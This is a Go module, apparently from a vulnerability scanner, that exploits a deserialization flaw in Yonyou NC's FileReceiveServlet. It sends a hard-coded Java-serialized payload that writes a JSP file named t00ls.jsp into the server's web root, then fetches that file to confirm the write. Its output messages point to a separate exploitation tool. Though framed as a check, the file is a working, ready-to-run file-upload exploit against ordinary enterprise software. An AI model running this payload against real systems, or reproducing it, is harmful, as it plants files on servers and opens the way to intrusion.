package FileReceiveServlet_Deser

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	postURL := url + "/servlet/FileReceiveServlet"
	getURL := url + "/t00ls.jsp"
	shellFlag := "t0test0ls"

	uploadHeader := map[string]string{
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Content-Type": "multipart/form-data;",
		"Referer":      "https://google.com",
	}

	uploadData := "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78" + shellFlag

	// 发送 POST 请求
	resp, err := client.R().SetHeaders(uploadHeader).SetBody(uploadData).Post(postURL)
	if err != nil || resp.StatusCode != 200 {
		color.Red.Println("[-] 用友 FileReceiveServlet反序列化漏洞不存在（POST 请求失败）")
		return
	}

	// 发送 GET 请求验证
	resp, err = client.R().SetHeaders(uploadHeader).Get(getURL)
	if err != nil || !strings.Contains(resp.String(), shellFlag) {
		color.Red.Println("[-] 用友 FileReceiveServlet反序列化漏洞不存在（GET 请求验证失败）")
		return
	}

	color.Green.Println("[+] 用友 FileReceiveServlet反序列化漏洞存在 注意结果不一定准确部分反序列化是直接访问接口返回状态来判断的 利用这个工具https://github.com/wgpsec/YongYouNcTool-> " + url)
}
